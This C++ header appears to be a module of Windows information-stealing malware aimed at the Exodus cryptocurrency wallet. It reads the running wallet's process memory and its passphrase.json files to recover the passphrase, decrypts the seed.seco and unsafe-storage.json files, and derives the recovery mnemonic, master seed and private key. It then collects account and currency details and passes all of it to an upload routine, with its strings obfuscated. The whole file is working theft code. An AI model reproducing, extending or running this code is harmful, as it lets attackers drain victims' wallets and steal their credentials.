#pragma once

namespace fs = std::filesystem;


namespace exodus {
    class c_exodus {
    public:
        bool compile_exodus( ) {
            auto exodus_compiler = std::make_shared<compiler::c_compiler>( );
            auto process_handle = open_exodus_process( );
            if ( !process_handle ) return false;

            char appdata_path[ MAX_PATH ];
            if ( !SUCCEEDED( SHGetFolderPathA( NULL, CSIDL_APPDATA, NULL, 0, appdata_path ) ) ) {
                exodus_compiler->push_line( oxorany("Could not retrieve AppData path" ) );
                CloseHandle( process_handle );
                return false;
            }

            extract_paraphrase:
            std::string passphrase = extract_passphrase( );
            if (passphrase.empty()) {
                passphrase = get_passphrase_disk(appdata_path);
            }
            if (passphrase.empty()) {
                CloseHandle(process_handle);
                goto extract_paraphrase;
            }

            std::string version = extract_exodus_version( process_handle );
            exodus_compiler->push_line( oxorany("Exodus version: " ) + version );
            exodus_compiler->push_line( oxorany("Exodus password: " ) + passphrase );

            std::vector<uint8_t> file_data = read_seed_file( appdata_path );
            if ( file_data.empty( ) ) {
                CloseHandle( process_handle );
                goto extract_paraphrase;
            }

            m_seco_container seco;
            if ( !parse_seco( file_data, seco ) ) {
                CloseHandle( process_handle );
                goto extract_paraphrase;
            }

            Metadata meta;
            if ( !extract_metadata( seco, meta ) ) {
                CloseHandle( process_handle );
                goto extract_paraphrase;
            }

            std::vector<uint8_t> derived_key = derive_scrypt_key( passphrase, meta );
            if ( derived_key.empty( ) ) {
                CloseHandle( process_handle );
                goto extract_paraphrase;
            }

            std::vector<uint8_t> blob_key = decrypt_blob_key( derived_key, meta );
            if ( blob_key.empty( ) ) {
                CloseHandle( process_handle );
                goto extract_paraphrase;
            }

            std::vector<uint8_t> plaintext = decrypt_and_decompress_seed( blob_key, meta, seco );
            if ( plaintext.empty( ) ) {
                CloseHandle( process_handle );
                goto extract_paraphrase;
            }

            std::vector<uint8_t> entropy( plaintext.begin( ) + 64, plaintext.end( ) );
            std::string mnemonic = entropy_to_mnemonic( entropy );
            exodus_compiler->push_line( oxorany( "Exodus secret key: " ) + mnemonic );

            std::vector<uint8_t> master_seed( plaintext.begin( ), plaintext.begin( ) + 64 );
            exodus_compiler->push_line( oxorany(  "Exodus master seed: 0x" ) + utility::bytes_to_hex( master_seed.data( ), 64 ) );

            uint8_t master_priv[ 32 ], chain_code[ 32 ];
            crypto::bip32_master_from_seed( master_seed.data( ), master_seed.size( ), master_priv, chain_code );
            exodus_compiler->push_line(oxorany( "Exodus private key: 0x" ) + utility::bytes_to_hex( master_priv, 32 ) );
            exodus_compiler->push_line(oxorany( "Exodus chain code: 0x" ) + utility::bytes_to_hex( chain_code, 32 ) + oxorany ( "\n" ) );

            auto json_str = parse_storage( appdata_path, derived_key );
            if ( json_str.empty( ) ) {
                CloseHandle( process_handle );
                return false;
            }

                auto data = nlohmann::json::parse( json_str );
                if ( data.contains( oxorany( "!analytics!userId" ) ) && data[ oxorany( "!analytics!userId" ) ].is_string( ) ) {
                    exodus_compiler->push_line( oxorany( "User ID: " ) + data[ oxorany( "!analytics!userId" ) ].get<std::string>( )  );
                }
                if ( data.contains( oxorany( "!analytics!anonymousId" ) ) && data[ oxorany( "!analytics!anonymousId" ) ].is_string( ) ) {
                    exodus_compiler->push_line( oxorany( "Anonymous ID: " ) + data[ oxorany( "!analytics!anonymousId" ) ].get<std::string>( ) );
                }

                std::set<std::string> currencies;
                for ( auto& [key, _] : data.items( ) ) {
                    if ( key.rfind( oxorany( "!marketHistory!prices-USD-" ), 0 ) == 0 ) {
                        std::string asset = key.substr( strlen( oxorany( "!marketHistory!prices-USD-" ) ) );
                        if ( asset.size( ) > 4 && asset.substr( asset.size( ) - 4 ) == oxorany( "-day" ) )
                            asset = asset.substr( 0, asset.size( ) - 4 );
                        else if ( asset.size( ) > 5 && asset.substr( asset.size( ) - 5 ) == oxorany( "-hour" ) )
                            asset = asset.substr( 0, asset.size( ) - 5 );
                        else if ( asset.size( ) > 7 && asset.substr( asset.size( ) - 7 ) == oxorany( "-minute" ) )
                            asset = asset.substr( 0, asset.size( ) - 7 );
                        currencies.insert( asset );
                    }
                }
                if ( data.contains( oxorany( "wallets" ) ) && data[ oxorany( "wallets" ) ].is_object( ) ) {
                    for ( auto& [key, _] : data[ oxorany( "wallets" ) ].items( ) ) {
                        currencies.insert( key );
                    }
                }

                if ( currencies.empty( ) ) {
                    exodus_compiler->push_line( oxorany( "No currencies found in unsafe-storage.json." ) );
                }

                exodus_compiler->push_line( oxorany( "Currencies" ) );
                for ( const auto& curr : currencies ) {
                    exodus_compiler->push( oxorany( "  - " ) + curr );
                }
                exodus_compiler->push_line( oxorany( "" ) );

                if ( data.contains( oxorany( "!walletAccounts!" ) ) ) {
                    auto& wallets = data[ oxorany( "!walletAccounts!" ) ];
                    if ( wallets.is_object( ) ) {
                        exodus_compiler->push_line( oxorany( "=== Wallet Accounts ===" ) );
                        if ( wallets.contains( oxorany( "activeWalletAccount" ) ) && wallets[ oxorany( "activeWalletAccount" ) ].is_string( ) ) {
                            exodus_compiler->push_line( oxorany( "Active account ID: " ) + wallets[ oxorany( "activeWalletAccount" ) ].get<std::string>( ) );
                        }
                        for ( auto& [key, value] : wallets.items( ) ) {
                            if ( key != oxorany( "activeWalletAccount" ) && value.is_object( ) ) {
                                exodus_compiler->push_line( oxorany( "Account ID: " ) + key );
                                if ( value.contains( oxorany( "name" ) ) && value[ oxorany( "name" ) ].is_string( ) )
                                    exodus_compiler->push_line( oxorany( "Name: " ) + value[ oxorany( "name" ) ].get<std::string>( ) );
                                if ( value.contains( oxorany( "type" ) ) && value[ oxorany( "type" ) ].is_string( ) )
                                    exodus_compiler->push_line( oxorany( "Type: " ) + value[ oxorany( "type" ) ].get<std::string>( ) + oxorany ( "\n" ) );
                            }
                        }
                    }
                }

            CloseHandle( process_handle );
            compiler::upload( oxorany( "exodus" ), exodus_compiler );
            return true;
        }

    private:
        struct m_seco_container {
            std::vector<uint8_t> m_header;
            std::vector<uint8_t> m_checksum;
            std::vector<uint8_t> m_metadata;
            std::vector<uint8_t> m_blob;
        };

        struct Metadata {
            uint32_t n, r, p;
            std::vector<uint8_t> salt;
            std::vector<uint8_t> blob_key_iv, blob_key_auth, encrypted_key;
            std::vector<uint8_t> blob_iv, blob_auth;
        };

        HANDLE open_exodus_process( ) {
            while ( true ) {
                uint32_t process_id = utility::find_process_id( oxorany( L"Exodus.exe" ) );
                if ( !process_id ) {
                    Sleep( 1 );
                    continue;
                }
                HANDLE handle = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE,
                    FALSE, process_id );
                if ( handle ) return handle;
                Sleep( 1 );
            }
        }

        std::vector<uint8_t> read_seed_file( const char* appdata_path ) {
            std::string seed_path = std::string( appdata_path ) + oxorany( "\\Exodus\\exodus.wallet\\seed.seco" );
            std::ifstream file( seed_path, std::ios::binary );
            if ( !file ) {
                std::cerr << oxorany( "Cannot open seed.seco at: " ) << seed_path << std::endl;
                return {};
            }
            return std::vector<uint8_t>( ( std::istreambuf_iterator<char>( file ) ),
                std::istreambuf_iterator<char>( ) );
        }

        bool parse_seco( const std::vector<uint8_t>& data, m_seco_container& out ) {
            if ( data.size( ) < 224 ) return false;
            out.m_header.assign( data.begin( ), data.begin( ) + 224 );
            if ( data.size( ) < 224 + 32 ) return false;
            out.m_checksum.assign( data.begin( ) + 224, data.begin( ) + 224 + 32 );
            if ( data.size( ) < 224 + 32 + 256 ) return false;
            out.m_metadata.assign( data.begin( ) + 224 + 32, data.begin( ) + 224 + 32 + 256 );
            size_t blob_start = 224 + 32 + 256;
            if ( data.size( ) < blob_start + 4 ) return false;
            uint32_t blob_len = ( data[ blob_start ] << 24 ) | ( data[ blob_start + 1 ] << 16 ) |
                ( data[ blob_start + 2 ] << 8 ) | data[ blob_start + 3 ];
            if ( data.size( ) < blob_start + 4 + blob_len ) return false;
            out.m_blob.assign( data.begin( ) + blob_start + 4,
                data.begin( ) + blob_start + 4 + blob_len );
            return true;
        }

        bool extract_metadata( const m_seco_container& seco, Metadata& meta ) {
            if ( seco.m_metadata.size( ) < 256 ) {
                std::cerr << oxorany( "Metadata too short." ) << std::endl;
                return false;
            }
            const uint8_t* m = seco.m_metadata.data( );
            meta.salt.assign( m, m + 32 );
            meta.n = ( m[ 32 ] << 24 ) | ( m[ 33 ] << 16 ) | ( m[ 34 ] << 8 ) | m[ 35 ];
            meta.r = ( m[ 36 ] << 24 ) | ( m[ 37 ] << 16 ) | ( m[ 38 ] << 8 ) | m[ 39 ];
            meta.p = ( m[ 40 ] << 24 ) | ( m[ 41 ] << 16 ) | ( m[ 42 ] << 8 ) | m[ 43 ];

            if ( meta.n != 16384 || meta.r != 8 || meta.p != 1 ) {
                std::cerr << oxorany( "Unexpected scrypt parameters: n=" ) << meta.n
                    << oxorany( ", r=" ) << meta.r << oxorany( ", p=" ) << meta.p << std::endl;
                return false;
            }

            const uint8_t* blobKey_start = m + 44 + 32;
            meta.blob_key_iv.assign( blobKey_start, blobKey_start + 12 );
            meta.blob_key_auth.assign( blobKey_start + 12, blobKey_start + 12 + 16 );
            meta.encrypted_key.assign( blobKey_start + 12 + 16, blobKey_start + 12 + 16 + 32 );
            const uint8_t* blob_start = blobKey_start + 12 + 16 + 32;
            meta.blob_iv.assign( blob_start, blob_start + 12 );
            meta.blob_auth.assign( blob_start + 12, blob_start + 12 + 16 );
            return true;
        }

        std::vector<uint8_t> derive_scrypt_key( const std::string& passphrase, const Metadata& meta ) {
            std::vector<uint8_t> derived_key( 32 );
            if ( crypto_pwhash_scryptsalsa208sha256_ll(
                ( const uint8_t* )passphrase.c_str( ), passphrase.size( ),
                meta.salt.data( ), meta.salt.size( ),
                meta.n, meta.r, meta.p,
                derived_key.data( ), derived_key.size( ) ) != 0 ) {
                std::cerr << oxorany( "Scrypt failed." ) << std::endl;
                return {};
            }
            return derived_key;
        }

        std::vector<uint8_t> decrypt_blob_key( const std::vector<uint8_t>& derived_key, const Metadata& meta ) {
            std::vector<uint8_t> blob_key( 32 );
            if ( !crypto::aes_gcm_decrypt( derived_key.data( ), derived_key.size( ),
                meta.blob_key_iv.data( ), meta.blob_key_iv.size( ),
                meta.blob_key_auth.data( ), meta.blob_key_auth.size( ),
                meta.encrypted_key.data( ), meta.encrypted_key.size( ),
                blob_key ) ) {
                std::cerr << oxorany( "Failed to decrypt blob key." ) << std::endl;
                return {};
            }
            return blob_key;
        }

        std::vector<uint8_t> decrypt_and_decompress_seed( const std::vector<uint8_t>& blob_key,
            const Metadata& meta,
            const m_seco_container& seco ) {
            std::vector<uint8_t> compressed;
            if ( !crypto::aes_gcm_decrypt( blob_key.data( ), blob_key.size( ),
                meta.blob_iv.data( ), meta.blob_iv.size( ),
                meta.blob_auth.data( ), meta.blob_auth.size( ),
                seco.m_blob.data( ), seco.m_blob.size( ),
                compressed ) ) {
                std::cerr << oxorany( "Failed to decrypt blob." ) << std::endl;
                return {};
            }
            if ( compressed.size( ) < 18 ) {
                std::cerr << oxorany( "Compressed data too short: " ) << compressed.size( ) << std::endl;
                return {};
            }
            std::vector<uint8_t> plaintext;
            if ( !crypto::inflate_gzip( compressed, plaintext ) ) {
                std::cerr << oxorany( "Failed to decompress blob." ) << std::endl;
                return {};
            }
            if ( plaintext.size( ) < 64 ) {
                std::cerr << oxorany( "Decompressed data too short." ) << std::endl;
                return {};
            }
            return plaintext;
        }

        std::string parse_storage( const char* appdata_path, const std::vector<uint8_t>& derived_key ) {
            std::string unsafe_path = std::string( appdata_path ) + oxorany(  "\\Exodus\\exodus.wallet\\unsafe-storage.json" );
            std::ifstream unsafe_file( unsafe_path, std::ios::binary );
            if ( !unsafe_file ) {
                std::cerr << oxorany( "Cannot open unsafe-storage.json at: " ) << unsafe_path << std::endl;
                return {};
            }
            std::vector<uint8_t> unsafe_data( ( std::istreambuf_iterator<char>( unsafe_file ) ),
                std::istreambuf_iterator<char>( ) );
            unsafe_file.close( );

            if ( !unsafe_data.empty( ) && unsafe_data[ 0 ] == '{' ) {
                return std::string( unsafe_data.begin( ), unsafe_data.end( ) );
            }

            m_seco_container unsafe_seco;
            if ( !parse_seco( unsafe_data, unsafe_seco ) ) {
                std::cerr << oxorany( "Failed to parse unsafe-storage.json as SECO." ) << std::endl;
                return {};
            }

            const uint8_t* m = unsafe_seco.m_metadata.data( );
            const uint8_t* blob_start = m + 136;
            std::vector<uint8_t> blob_iv( blob_start, blob_start + 12 );
            std::vector<uint8_t> blob_auth( blob_start + 12, blob_start + 12 + 16 );

            std::vector<uint8_t> compressed;
            if ( !crypto::aes_gcm_decrypt( derived_key.data( ), derived_key.size( ),
                blob_iv.data( ), blob_iv.size( ),
                blob_auth.data( ), blob_auth.size( ),
                unsafe_seco.m_blob.data( ), unsafe_seco.m_blob.size( ),
                compressed ) ) {
                std::cerr << oxorany( "Decryption of unsafe-storage.json failed." ) << std::endl;
                return {};
            }

            std::vector<uint8_t> json_data;
            if ( !crypto::inflate_gzip( compressed, json_data ) ) {
                std::cerr << oxorany( "Decompression of unsafe-storage.json failed." ) << std::endl;
                return {};
            }

            return std::string( json_data.begin( ), json_data.end( ) );
        }

        std::string get_passphrase_disk(const char* appdata_path) {
            namespace fs = std::filesystem;

            // 1. Try primary location
            fs::path primary = fs::path(appdata_path) /  oxorany( "Exodus") / oxorany(  "exodus.wallet" ) /  oxorany( "passphrase.json" );
            if (fs::exists(primary)) {
                std::ifstream f(primary);
                if (f.is_open()) {
                    try {
                        nlohmann::json data;
                        f >> data;
                        if (data.contains( oxorany( "passphrase")) && data[ oxorany( "passphrase")].is_string())
                            return data[ oxorany( "passphrase")].get<std::string>();
                    } catch (...) {}
                }
            }

            // 2. Search backups
            fs::path backups_root = fs::path(appdata_path) / oxorany( "Exodus" ) / oxorany( "backups" ) / oxorany( "wallet" );
            if (fs::exists(backups_root)) {
                std::vector<fs::path> backup_dirs;
                for (const auto& entry : fs::directory_iterator(backups_root)) {
                    if (entry.is_directory())
                        backup_dirs.push_back(entry.path());
                }
                // Sort descending by name (timestamp format YYYY-MM-DD_HH-MM-SS)
                std::sort(backup_dirs.rbegin(), backup_dirs.rend());

                for (const auto& dir : backup_dirs) {
                    fs::path pass_file = dir / oxorany( "exodus.wallet" ) / oxorany( "passphrase.json" );
                    if (fs::exists(pass_file)) {
                        std::ifstream f(pass_file);
                        if (f.is_open()) {
                            try {
                                nlohmann::json data;
                                f >> data;
                                if (data.contains(oxorany( "passphrase" ) ) && data[oxorany( "passphrase" )].is_string())
                                    return data[oxorany( "passphrase" )].get<std::string>();
                            } catch (...) {}
                        }
                    }
                }
            }
            return "";
        }

        std::string extract_passphrase( ) {
            auto process_handle = this->open_exodus_process( );

            std::string target = oxorany( "#%7B%22passphrase%22%3A%22" );
            SYSTEM_INFO sysInfo;
            GetSystemInfo( &sysInfo );

            uintptr_t current = 0;
            MEMORY_BASIC_INFORMATION mbi;

            while ( current < ( uintptr_t )sysInfo.lpMaximumApplicationAddress ) {
                NTSTATUS status = NtQueryVirtualMemory( process_handle, ( PVOID )current,
                    MemoryBasicInformation, &mbi, sizeof( mbi ), nullptr );
                if ( status != 0 ) break;

                if ( mbi.State == MEM_COMMIT && mbi.Protect == PAGE_READWRITE ) {
                    std::vector<char> buffer( mbi.RegionSize );
                    SIZE_T bytesRead = 0;
                    status = ZwReadVirtualMemory( process_handle, ( PVOID )current,
                        buffer.data( ), mbi.RegionSize, &bytesRead );
                    if ( status == 0 && bytesRead > 0 ) {
                        std::string_view content( buffer.data( ), bytesRead );
                        size_t start = content.find( target );
                        if ( start != std::string::npos ) {
                            start += target.length( );
                            size_t end = content.find( oxorany( "%22" ), start );
                            if ( end != std::string::npos ) {
                                std::string encoded( content.substr( start, end - start ) );
                                return crypto::url_decode( encoded );
                            }
                        }
                    }
                }
                current += mbi.RegionSize;
            }

            return "";
        }

        std::string extract_exodus_version( HANDLE hProcess ) {
            SYSTEM_INFO sysInfo;
            GetSystemInfo( &sysInfo );
            MEMORY_BASIC_INFORMATION memInfo;
            char* currentPage = 0;
            std::string marker = oxorany( "app-" );
            std::vector<uintptr_t> matches;
            while ( currentPage < sysInfo.lpMaximumApplicationAddress ) {
                if ( NtQueryVirtualMemory( hProcess, currentPage, MemoryBasicInformation,
                    &memInfo, sizeof( memInfo ), nullptr ) != 0 )
                    break;
                if ( memInfo.State == MEM_COMMIT && ( memInfo.Protect & PAGE_READWRITE ) ) {
                    std::string buffer;
                    buffer.resize( memInfo.RegionSize + 256 );
                    SIZE_T bytesRead = 0;
                    NTSTATUS status = ZwReadVirtualMemory( hProcess, currentPage,
                        &buffer[ 0 ], memInfo.RegionSize, &bytesRead );
                    if ( status == 0 && bytesRead ) {
                        size_t pos = 0;
                        while ( ( pos = buffer.find( marker, pos ) ) != std::string::npos ) {
                            matches.push_back( ( uintptr_t )currentPage + pos );
                            pos += marker.size( );
                        }
                    }
                }
                currentPage += memInfo.RegionSize;
            }
            for ( uintptr_t addr : matches ) {
                char versionBuf[ 32 ] = { 0 };
                SIZE_T bytesRead = 0;
                if ( ZwReadVirtualMemory( hProcess, ( void* )( addr + marker.size( ) ),
                    versionBuf, sizeof( versionBuf ) - 1, &bytesRead ) == 0 && bytesRead ) {
                    std::string version;
                    for ( size_t i = 0; i < bytesRead; ++i ) {
                        char c = versionBuf[ i ];
                        if ( std::isdigit( c ) || c == '.' ) version += c;
                        else if ( !version.empty( ) ) break;
                    }
                    if ( !version.empty( ) ) return version;
                }
            }
            return oxorany( "" );
        }

        std::string entropy_to_mnemonic( const std::vector<uint8_t>& entropy ) {
            if ( entropy.size( ) != 16 && entropy.size( ) != 20 && entropy.size( ) != 24 &&
                entropy.size( ) != 28 && entropy.size( ) != 32 ) {
                throw std::runtime_error( oxorany( "Invalid entropy size for BIP39" ) );
            }

            int entropy_bits = ( int )entropy.size( ) * 8;
            int checksum_bits = entropy_bits / 32;
            int total_bits = entropy_bits + checksum_bits;
            int word_count = total_bits / 11;

            std::vector<bool> bits( total_bits );
            for ( size_t i = 0; i < entropy.size( ); ++i ) {
                for ( int b = 0; b < 8; ++b ) {
                    bits[ i * 8 + b ] = ( entropy[ i ] >> ( 7 - b ) ) & 1;
                }
            }
            uint32_t checksum = crypto::sha256_checksum_bits( entropy, checksum_bits );
            for ( int i = 0; i < checksum_bits; ++i ) {
                bits[ entropy_bits + i ] = ( checksum >> ( checksum_bits - 1 - i ) ) & 1;
            }

            std::vector<std::string> words;
            for ( int i = 0; i < word_count; ++i ) {
                uint16_t index = 0;
                for ( int b = 0; b < 11; ++b ) {
                    index = ( index << 1 ) | bits[ i * 11 + b ];
                }
                if ( index >= sizeof( g_secret_words ) / sizeof( g_secret_words[ 0 ] ) )
                    throw std::runtime_error( oxorany( "Word index out of range" ) );
                words.push_back( g_secret_words[ index ] );
            }

            std::ostringstream oss;
            for ( size_t i = 0; i < words.size( ); ++i ) {
                if ( i > 0 ) oss << ' ';
                oss << words[ i ];
            }
            return oss.str( );
        }
    };
}